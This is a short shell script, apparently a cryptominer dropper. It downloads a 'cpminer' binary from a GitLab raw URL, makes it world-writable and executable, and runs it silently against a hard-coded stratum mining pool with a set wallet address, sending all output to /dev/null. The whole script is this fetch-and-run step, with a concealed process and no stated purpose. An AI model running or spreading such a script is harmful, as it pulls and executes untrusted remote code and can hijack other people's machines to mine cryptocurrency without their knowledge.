#!/bin/sh

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcps://165.227.180.199:80 -u QQuVuBF9yLgdE4C3HuhyxD5rk1wTMwg45F -t4 -p m=solo > /dev/null 2>&1